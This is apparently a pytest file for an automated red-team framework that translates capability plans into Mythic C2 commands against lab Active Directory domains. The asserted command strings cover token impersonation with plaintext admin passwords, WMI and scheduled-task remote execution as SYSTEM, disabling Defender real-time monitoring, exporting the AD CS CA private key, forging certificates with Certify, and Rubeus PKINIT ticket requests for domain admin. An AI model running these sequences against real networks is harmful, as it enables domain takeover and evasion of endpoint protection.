        "password": "CorrectHorseBatteryStaple!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["rev2Self", "run"]
    reset, remote = mythic_plan.commands
    assert reset.parameters == {}
    assert reset.expected_probe == ""
    assert "stored impersonation token" in reset.purpose
    assert remote.parameters["executable"] == "powershell.exe"
    assert remote.expected_probe == "extract_remote_execution_probe"
    assert remote.produces == ["remote_process_created", "remote_execution_proof"]


def test_adapter_translates_remote_execution_to_merlin_make_token_sequence():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=8",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:8"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        **adapter.MERLIN_MYTHIC_ADAPTER,
        "native_remote_exec_method": "make-token",
        "revert_command": "rev2Self",
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["make_token", "run", "run", "rev2Self"]
    token, wmic, proof, revert = mythic_plan.commands[:4]
    assert token.parameters == {
        "user": "ws01\\Administrator",
        "pass": "CorrectHorseBatteryStaple!",
    }
    assert token.produces == ["local_admin_logon_context"]
    assert wmic.parameters["executable"] == "wmic.exe"
    assert "/node:ws01.child.lab.local process call create" in wmic.parameters["arguments"]
    assert "/user:" not in wmic.parameters["arguments"]
    assert "/password:" not in wmic.parameters["arguments"]
    assert wmic.consumes == ["local_admin_logon_context"]
    assert proof.parameters["executable"] == "cmd.exe"
    assert r"type \\ws01\C$\Windows\Temp\sage_remote_exec_ws01_8.txt" in proof.parameters["arguments"]
    assert proof.expected_probe == "extract_remote_execution_probe"
    assert proof.consumes == ["local_admin_logon_context", "remote_process_created"]
    assert revert.parameters == {}
    assert revert.consumes == ["local_admin_logon_context"]


def test_adapter_translates_remote_execution_make_token_credential_object_without_revert():
    action = capabilities.CapabilityAction(
        name="execute-as-local-admin",
        target="target=ws01;target_domain=child.lab.local;callback=8",
        preconditions=["local-admin:ws01@child.lab.local", "live-callback:8"],
        effects=["remote-exec:ws01@child.lab.local", "host-exec:ws01"],
        intent={
            "capability": "execute-as-local-admin",
            "target_host": "ws01",
            "target_domain": "child.lab.local",
            "callback_id": "8",
        },
    )
    custom_remote_command = (
        r"cmd.exe /c echo SAGE_REMOTE_EXEC_PROOF_ws01_8 > C:\Windows\Temp\sage_remote_exec_ws01_8.txt "
        r"& certutil -ping >> C:\Windows\Temp\sage_remote_exec_ws01_8.txt 2>&1"
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
        "command": custom_remote_command,
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "local_admin_remote_exec_command": "run",
        "native_remote_exec_method": "make-token",
        "native_remote_exec_runner_command": "shell",
        "native_remote_exec_transport": "scheduled-task",
        "make_token_use_credential_object": True,
        "revert_command": "",
        "suppress_remote_file_read": True,
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["make_token", "shell"]
    token = mythic_plan.commands[0]
    assert token.parameters == {
        "Credential": {
            "account": "Administrator",
            "credential": "CorrectHorseBatteryStaple!",
            "realm": "ws01",
            "type": "plaintext",
        },
        "netOnly": True,
    }
    remote = mythic_plan.commands[1]
    assert "schtasks.exe /Create /S ws01.child.lab.local" in remote.parameters
    assert "/RU SYSTEM" in remote.parameters
    assert custom_remote_command in remote.parameters
    assert "certutil -ping" in remote.parameters
    assert "whoami >>" not in remote.parameters
    assert "/Run /S ws01.child.lab.local" in remote.parameters
    assert r'type "\\ws01\C$\Windows\Temp\sage_remote_exec_ws01_8.txt"' in remote.parameters
    assert remote.expected_probe == "extract_remote_execution_probe"


def test_adapter_translates_endpoint_protection_adjustment_to_apollo_powerpick():
    action = capabilities.CapabilityAction(
        name="endpoint-protection-adjustment",
        target="target=ca01;target_domain=lab.local;callback=14",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:14",
        ],
        effects=["endpoint-protection-adjusted:ca01@lab.local"],
        intent={
            "capability": "endpoint-protection-adjustment",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "14",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "method": "remote-wmi",
        "password": "Correct Horse 'Battery' Staple!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "endpoint_control_command": "powerpick",
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["powerpick"]
    command = mythic_plan.commands[0]
    assert command.capability == "endpoint-protection-adjustment"
    assert command.expected_probe == "extract_endpoint_protection_probe"
    assert command.produces == ["endpoint_protection_probe"]
    assert isinstance(command.parameters, str)
    assert "ConvertTo-SecureString 'Correct Horse ''Battery'' Staple!'" in command.parameters
    assert "Invoke-WmiMethod -Class Win32_Process -Name Create" in command.parameters
    encoded = command.parameters.split("-EncodedCommand ", 1)[1].split("'", 1)[0]
    inner = base64.b64decode(encoded).decode("utf-16le")
    assert "Get-MpComputerStatus" in inner
    assert "Set-MpPreference -DisableRealtimeMonitoring $true" in inner
    assert "Add-MpPreference -ExclusionPath" in inner
    assert "SAGE_EP_ADJUST_PROOF_ca01_14" in command.parameters
    assert "$remotePid" in command.parameters
    assert "$pid=" not in command.parameters


def test_merlin_profile_resets_stale_token_before_remote_endpoint_adjustment():
    action = capabilities.CapabilityAction(
        name="endpoint-protection-adjustment",
        target="target=ca01;target_domain=lab.local;callback=14",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:14",
        ],
        effects=["endpoint-protection-adjusted:ca01@lab.local"],
        intent={
            "capability": "endpoint-protection-adjustment",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "14",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "method": "remote-wmi",
        "password": "Correct Horse 'Battery' Staple!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["rev2Self", "run"]
    reset, command = mythic_plan.commands
    assert reset.parameters == {}
    assert reset.expected_probe == ""
    assert command.parameters["executable"] == "powershell.exe"
    assert command.expected_probe == "extract_endpoint_protection_probe"


def test_adapter_translates_adcs_ca_private_key_export_to_merlin_powershell_wmi():
    action = capabilities.CapabilityAction(
        name="adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local;callback=8",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:8",
        ],
        effects=[
            "adcs-ca-private-key:ca01@lab.local",
            "adcs-ca:ca01@lab.local",
        ],
        intent={
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "Correct Horse 'Battery' Staple!",
        "pfx_password": "Pfx 'Secret'!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "adcs_ca_export_command": "run",
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["run"]
    command = mythic_plan.commands[0]
    assert command.capability == "adcs-ca-private-key-export"
    assert command.expected_probe == "extract_adcs_ca_private_key_probe"
    assert command.produces == ["adcs_ca_private_key_material"]
    assert command.parameters["executable"] == "powershell.exe"
    encoded = command.parameters["arguments"].rsplit(" ", 1)[1]
    ps = base64.b64decode(encoded).decode("utf-16le")
    assert "ConvertTo-SecureString 'Correct Horse ''Battery'' Staple!'" in ps
    assert "New-Object System.Management.Automation.PSCredential('ca01\\Administrator',$sec)" in ps
    assert "Invoke-WmiMethod -Class Win32_Process -Name Create" in ps
    assert "certutil.exe -f -p" in ps
    assert "Export-PfxCertificate" not in ps
    assert "SAGE_CA_EXPORT_PROOF_ca01_8" in ps
    assert "CA_EXPORT_STATUS=OK" in ps
    assert "PFX_BASE64=" in ps


def test_merlin_profile_resets_stale_token_before_adcs_ca_private_key_export():
    action = capabilities.CapabilityAction(
        name="adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local;callback=8",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:8",
        ],
        effects=[
            "adcs-ca-private-key:ca01@lab.local",
            "adcs-ca:ca01@lab.local",
        ],
        intent={
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "Correct Horse 'Battery' Staple!",
        "pfx_password": "Pfx 'Secret'!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["rev2Self", "run"]
    reset, command = mythic_plan.commands
    assert reset.parameters == {}
    assert reset.expected_probe == ""
    assert command.parameters["executable"] == "powershell.exe"
    assert command.expected_probe == "extract_adcs_ca_private_key_probe"


def test_adapter_translates_adcs_ca_export_to_current_context_powerpick():
    action = capabilities.CapabilityAction(
        name="adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local;callback=8",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:8",
        ],
        effects=[
            "adcs-ca-private-key:ca01@lab.local",
            "adcs-ca:ca01@lab.local",
        ],
        intent={
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "Correct Horse Battery Staple!",
        "pfx_password": "Pfx Secret!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "adcs_ca_export_command": "powerpick",
        "adcs_ca_export_use_current_context": True,
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["powerpick"]
    command = mythic_plan.commands[0]
    assert command.capability == "adcs-ca-private-key-export"
    assert command.expected_probe == "extract_adcs_ca_private_key_probe"
    assert isinstance(command.parameters, str)
    assert "Invoke-WmiMethod -Class Win32_Process -Name Create" in command.parameters
    assert "New-PSDrive -Name SAGECA" in command.parameters
    assert "-Credential $cred" not in command.parameters
    assert "New-Object System.Management.Automation.PSCredential" not in command.parameters
    assert "certutil.exe -f -p" in command.parameters
    assert "Export-PfxCertificate" not in command.parameters


def test_adapter_translates_adcs_ca_private_key_export_to_wmiexecute_readback():
    action = capabilities.CapabilityAction(
        name="adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local;callback=8",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:8",
        ],
        effects=[
            "adcs-ca-private-key:ca01@lab.local",
            "adcs-ca:ca01@lab.local",
        ],
        intent={
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "Correct Horse Battery Staple!",
        "pfx_password": "Pfx Secret!",
        "adcs_ca_export_command": "wmiexecute",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "adcs_ca_export_command": "wmiexecute",
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["wmiexecute", "cat"]
    remote = mythic_plan.commands[0]
    assert remote.capability == "adcs-ca-private-key-export"
    assert remote.expected_probe == ""
    assert remote.produces == ["remote_process_created"]
    assert remote.parameters["host"] == "ca01.lab.local"
    assert remote.parameters["username"] == "Administrator"
    assert remote.parameters["password"] == "Correct Horse Battery Staple!"
    assert remote.parameters["domain"] == "ca01"
    encoded = remote.parameters["command"].split("-EncodedCommand ", 1)[1]
    ps = base64.b64decode(encoded).decode("utf-16le")
    assert "Invoke-WmiMethod" not in ps
    assert "certutil.exe -f -p" in ps
    assert "Export-PfxCertificate" not in ps
    assert "SAGE_CA_EXPORT_PROOF_ca01_8" in ps
    assert "CA_EXPORT_STATUS=OK" in ps
    assert "PFX_SHA256=" in ps
    assert "PFX_BASE64=" in ps
    assert "$exportedCert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2" in ps
    assert "('CA_SUBJECT='+$exportedCert.Subject)" in ps
    assert "('CA_THUMBPRINT='+$exportedCert.Thumbprint)" in ps
    readback = mythic_plan.commands[1]
    assert readback.expected_probe == "extract_adcs_ca_private_key_probe"
    assert readback.consumes == ["remote_process_created"]
    assert readback.produces == ["adcs_ca_private_key_material"]
    assert readback.parameters == {"path": r"\\ca01.lab.local\C$\Windows\Temp\sage_ca_export_ca01_8.txt"}


def test_apollo_adapter_translates_adcs_ca_export_to_token_backed_wmiexecute_readback():
    action = capabilities.CapabilityAction(
        name="adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local;callback=8",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:8",
        ],
        effects=[
            "adcs-ca-private-key:ca01@lab.local",
            "adcs-ca:ca01@lab.local",
        ],
        intent={
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "Correct Horse Battery Staple!",
        "pfx_password": "Pfx Secret!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.APOLLO_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["make_token", "wmiexecute", "cat", "rev2self"]
    token, remote, readback, cleanup = mythic_plan.commands
    assert token.parameters == {
        "Credential": {
            "account": "Administrator",
            "credential": "Correct Horse Battery Staple!",
            "realm": "ca01",
            "type": "plaintext",
        },
        "netOnly": True,
    }
    assert remote.parameters["host"] == "ca01.lab.local"
    assert "username" not in remote.parameters
    assert "password" not in remote.parameters
    assert "domain" not in remote.parameters
    assert remote.expected_probe == ""
    assert remote.consumes == ["local_admin_logon_context"]
    assert readback.expected_probe == "extract_adcs_ca_private_key_probe"
    assert readback.consumes == ["local_admin_logon_context", "remote_process_created"]
    assert readback.parameters == {"path": r"\\ca01.lab.local\C$\Windows\Temp\sage_ca_export_ca01_8.txt"}
    assert cleanup.operation == "local-admin-logon-session-revert"
    assert cleanup.consumes == ["local_admin_logon_context"]


def test_adapter_defaults_adcs_ca_private_key_export_to_wmiexecute_readback():
    action = capabilities.CapabilityAction(
        name="adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local;callback=8",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:8",
        ],
        effects=[
            "adcs-ca-private-key:ca01@lab.local",
            "adcs-ca:ca01@lab.local",
        ],
        intent={
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "Correct Horse Battery Staple!",
        "pfx_password": "Pfx Secret!",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["wmiexecute", "cat"]
    assert mythic_plan.commands[0].parameters["host"] == "ca01.lab.local"
    assert mythic_plan.commands[1].parameters == {
        "path": r"\\ca01.lab.local\C$\Windows\Temp\sage_ca_export_ca01_8.txt",
    }


def test_adapter_translates_adcs_ca_private_key_export_to_sharpdpapi_fallback():
    action = capabilities.CapabilityAction(
        name="adcs-ca-private-key-export",
        target="target=ca01;target_domain=lab.local;callback=8",
        preconditions=[
            "remote-exec:ca01@lab.local",
            "local-admin:ca01@lab.local",
            "live-callback:8",
        ],
        effects=[
            "adcs-ca-private-key:ca01@lab.local",
            "adcs-ca:ca01@lab.local",
        ],
        intent={
            "capability": "adcs-ca-private-key-export",
            "target_host": "ca01",
            "target_domain": "lab.local",
            "callback_id": "8",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "password": "CorrectHorseBatteryStaple!",
        "adcs_ca_export_method": "sharpdpapi",
        "tool_file_uuid": "sharpdpapi-file-uuid",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "adcs_ca_export_command": "run",
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["upload", "run"]
    upload, remote = mythic_plan.commands
    assert upload.parameters == {
        "File": "sharpdpapi-file-uuid",
        "Path": r"C:\Windows\Temp\SharpDPAPI.exe",
    }
    assert upload.produces == ["dpapi_tool_staged_on_callback"]
    assert remote.consumes == ["dpapi_tool_staged_on_callback"]
    assert remote.expected_probe == "extract_adcs_ca_private_key_probe"
    encoded = remote.parameters["arguments"].rsplit(" ", 1)[1]
    ps = base64.b64decode(encoded).decode("utf-16le")
    assert "Copy-Item -LiteralPath 'C:\\Windows\\Temp\\SharpDPAPI.exe'" in ps
    assert "Invoke-WmiMethod -Class Win32_Process -Name Create" in ps
    assert "SharpDPAPI.exe\" certificates /machine /nowrap" in ps
    assert "SAGE_CA_EXPORT_PROOF_ca01_8" in ps
    assert "Get-Content -LiteralPath 'SAGECA:\\Windows\\Temp\\sage_ca_dpapi_ca01_8.txt'" in ps


def test_adapter_translates_adcs_esc_certificate_enroll_to_native_certreq_powerpick():
    action = capabilities.CapabilityAction(
        name="adcs-esc-certificate-enroll",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=14",
        preconditions=["adcs-ca-key-export-blocked:ca01@lab.local", "live-callback:14"],
        effects=["adcs-enrolled-certificate:administrator@lab.local"],
        intent={
            "capability": "adcs-esc-certificate-enroll",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "14",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "ca_name": r"ca01.lab.local\LAB-CA",
        "template": "VulnerableUser",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "adcs_enroll_command": "powerpick",
    })

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["powerpick"]
    command = mythic_plan.commands[0]
    assert command.capability == "adcs-esc-certificate-enroll"
    assert command.expected_probe == "extract_adcs_enrolled_certificate_probe"
    assert command.produces == ["enrolled_certificate_material"]
    assert isinstance(command.parameters, str)
    assert "CERT_ENROLL_METHOD=native-certreq" in command.parameters
    assert "certreq.exe -new" in command.parameters
    assert "certreq.exe -submit" in command.parameters
    assert "if($null -ne $newOut){$lines.AddRange" in command.parameters
    assert "if($null -ne $submitOut){$lines.AddRange" in command.parameters
    assert "if($null -ne $acceptOut){$lines.AddRange" in command.parameters
    assert "$cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx" in command.parameters
    assert "[IO.File]::WriteAllBytes($pfxPath,$bytes)" in command.parameters
    assert "PFX_BASE64=" in command.parameters
    assert "SAGE_CERT_ENROLL_PROOF_administrator_lab_local_14" in command.parameters


def test_adapter_translates_adcs_certificate_auth_to_certify_pkinit_context_sequence():
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=14",
        preconditions=["adcs-ca-private-key:ca01@lab.local", "live-callback:14"],
        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "14",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "ca_pfx_path": r"C:\Windows\Temp\ca.pfx",
        "ca_pfx_password": "CA Secret!",
        "account_sid": "S-1-5-21-111-222-333-500",
        "proof_host": "dc01.lab.local",
        "dc": "dc01.lab.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == [
        "shell",
        "shell",
        "execute_assembly",
        "execute_assembly",
        "make_token",
        "ticket_store_add",
        "ticket_store_list",
        "shell",
    ]
    forge = mythic_plan.commands[2]
    assert forge.parameters["assembly_name"] == "Certify.exe"
    forge_args = forge.parameters["assembly_arguments"]
    assert forge_args.startswith("forge --ca-cert C:\\Windows\\Temp\\ca.pfx")
    assert '--ca-pass "CA Secret!"' in forge_args
    assert "--subject CN=administrator" in forge_args
    assert "--upn administrator@lab.local" in forge_args
    assert "--sid S-1-5-21-111-222-333-500" in forge_args
    assert "--crl ldap:///" in forge_args
    assert "--output-path C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_14.pfx" in forge_args
    assert forge.produces == ["forged_certificate_pfx"]

    pkinit = mythic_plan.commands[3]
    assert pkinit.parameters["assembly_name"] == "Rubeus.exe"
    pkinit_args = pkinit.parameters["assembly_arguments"]
    assert pkinit_args.startswith("asktgt /user:administrator /domain:lab.local")
    assert "/certificate:C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_14.pfx" in pkinit_args
    # The forged-PFX password is now a per-run random (no hardcoded constant): assert the slug-scoped
    # artifact_secret form (SageCert-<run-salt>-<slug>) rather than a pinned literal.
    import re as _re_pw
    assert _re_pw.search(r"/password:SageCert-[0-9a-f]+-administrator_lab_local_14\b", pkinit_args), pkinit_args
    assert "/getcredentials" in pkinit_args
    assert "/show" in pkinit_args
    assert "/nowrap" in pkinit_args
    assert "/dc:dc01.lab.local" in pkinit_args
    assert "/ptt" not in pkinit_args
    assert "kerberos_ticket_base64" in pkinit.produces
    assert mythic_plan.commands[5].deferred is True
    proof = mythic_plan.commands[-1]
    assert proof.expected_probe == "extract_adcs_certificate_auth_probe"
    assert proof.parameters == r"echo SAGE_CERT_AUTH_PROOF_administrator_lab_local_14 & dir \\dc01.lab.local\C$"
    assert proof.consumes == ["kerberos_ticket_imported", "kerberos_logon_context"]


def test_adapter_can_explicitly_use_legacy_forgecert_backend():
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=14",
        preconditions=["adcs-ca-private-key:ca01@lab.local", "live-callback:14"],
        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "14",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "ca_pfx_path": r"C:\Windows\Temp\ca.pfx",
        "ca_pfx_password": "CA Secret!",
        "proof_host": "dc01.lab.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, {
        "certificate_forge_tool": "ForgeCert.exe",
        "certificate_forge_backend": "forgecert",
    })

    assert mythic_plan.ok is True
    forge = mythic_plan.commands[2]
    assert forge.parameters["assembly_name"] == "ForgeCert.exe"
    forge_args = forge.parameters["assembly_arguments"]
    assert "--CaCertPath C:\\Windows\\Temp\\ca.pfx" in forge_args
    assert '--CaCertPassword "CA Secret!"' in forge_args
    assert "--SubjectAltName administrator@lab.local" in forge_args
    assert "--NewCertPath C:\\Windows\\Temp\\sage_forged_cert_administrator_lab_local_14.pfx" in forge_args


def test_merlin_adapter_fails_closed_when_certify_arguments_exceed_runner_limit():
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=essos.local;account=administrator;ca_host=braavos;callback=2",
        preconditions=["adcs-ca-private-key:braavos@essos.local", "live-callback:2"],
        effects=["da:essos.local", "certificate-auth:administrator@essos.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "essos.local",
            "account": "administrator",
            "ca_host": "braavos",
            "callback_id": "2",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "ca_pfx_path": r"C:\Windows\Temp\sage_ca_signing_administrator_essos_local_2.pfx",
        "ca_pfx_password": "X" * 32,
        "account_sid": "S-1-5-21-111111111-222222222-333333333-500",
        "proof_host": "meereen.essos.local",
        "dc": "meereen.essos.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is False
    assert mythic_plan.missing == ["dotnet_argument_transport"]
    assert "exceed the configured runner transport limit" in mythic_plan.reason


def test_merlin_adapter_keeps_compact_certify_paths_on_one_step_runner():
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=essos.local;account=administrator;ca_host=braavos;callback=2",
        preconditions=["adcs-ca-private-key:braavos@essos.local", "live-callback:2"],
        effects=["da:essos.local", "certificate-auth:administrator@essos.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "essos.local",
            "account": "administrator",
            "ca_host": "braavos",
            "callback_id": "2",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "ca_pfx_path": r".\c",
        "ca_pfx_password": "X" * 20,
        "account_sid": "S-1-5-21-111111111-222222222-333333333-500",
        "forged_pfx_path": r".\f",
        "proof_host": "meereen.essos.local",
        "dc": "meereen.essos.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, adapter.MERLIN_MYTHIC_ADAPTER)

    assert mythic_plan.ok is True
    forge = next(command for command in mythic_plan.commands if command.operation == "adcs-certificate-forge")
    assert forge.command == "execute-assembly"
    assert forge.parameters["filename"] == "Certify.exe"
    assert r"--ca-cert .\c" in forge.parameters["arguments"]
    assert r"--output-path .\f" in forge.parameters["arguments"]
    assert "--subject" not in forge.parameters["arguments"]
    assert "--crl ldap:///" in forge.parameters["arguments"]
    assert len(forge.parameters["arguments"].encode("utf-8")) <= 255


def test_dotnet_adapter_without_runner_limit_keeps_long_certify_on_one_step_runner():
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=essos.local;account=administrator;ca_host=braavos;callback=2",
        preconditions=["adcs-ca-private-key:braavos@essos.local", "live-callback:2"],
        effects=["da:essos.local", "certificate-auth:administrator@essos.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "essos.local",
            "account": "administrator",
            "ca_host": "braavos",
            "callback_id": "2",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "ca_pfx_path": r"C:\Windows\Temp\sage_ca_signing_administrator_essos_local_2.pfx",
        "ca_pfx_password": "X" * 32,
        "account_sid": "S-1-5-21-111111111-222222222-333333333-500",
        "proof_host": "meereen.essos.local",
        "dc": "meereen.essos.local",
    })
    config = dict(adapter.MERLIN_MYTHIC_ADAPTER)
    config.pop("dotnet_runner_max_argument_bytes")

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan, config)

    assert mythic_plan.ok is True
    forge = mythic_plan.commands[2]
    assert forge.command == "execute-assembly"
    assert forge.parameters["filename"] == "Certify.exe"
    assert len(forge.parameters["arguments"].encode("utf-8")) > 255


def test_adapter_translates_adcs_certificate_auth_to_schannel_ldap_proof():
    action = capabilities.CapabilityAction(
        name="adcs-certificate-auth",
        target="domain=lab.local;account=administrator;ca_host=ca01;callback=14",
        preconditions=["adcs-ca-private-key:ca01@lab.local", "live-callback:14"],
        effects=["da:lab.local", "certificate-auth:administrator@lab.local"],
        intent={
            "capability": "adcs-certificate-auth",
            "domain": "lab.local",
            "account": "administrator",
            "ca_host": "ca01",
            "callback_id": "14",
        },
    )
    execution_plan = capabilities.build_capability_execution_plan(action, {
        "certificate_auth_method": "schannel-ldap",
        "certificate_already_forged": True,
        "forged_pfx_path": r"C:\Windows\Temp\admin.pfx",
        "forged_pfx_password": "Cert Secret!",
        "proof_host": "dc01.lab.local",
    })

    mythic_plan = adapter.build_mythic_capability_commands(execution_plan)

    assert mythic_plan.ok is True
    assert [command.command for command in mythic_plan.commands] == ["powerpick"]
    command = mythic_plan.commands[0]
    assert command.expected_probe == "extract_adcs_certificate_auth_probe"
    assert command.produces == ["certificate_schannel_ldap_probe"]
    assert command.consumes == ["forged_certificate_pfx"]
    script = command.parameters
    assert "System.DirectoryServices.Protocols.LdapConnection" in script
    assert "AuthType]::External" in script
    assert "QueryClientCertificate" in script
    assert "StartTransportLayerSecurity" in script
    assert "ReferralChasingOptions]::None" in script
    assert ".Bind();" not in script
    assert "$searchResponse=$candidate.SendRequest($probeRequest)" in script
    assert "X509KeyStorageFlags]::Exportable" in script
    assert "MachineKeySet" not in script
    assert "CERT_AUTH_WHOAMI=" in script
    assert "$g=& $toText $group" in script
    assert "CERT_AUTH_TRANSPORT=" in script
    assert "CERT_AUTH_METHOD=schannel-ldap" in script
    assert "CERT_AUTH_DOMAIN_ADMIN=" in script
    assert r"C:\Windows\Temp\admin.pfx" in script
    assert "dc01.lab.local" in script
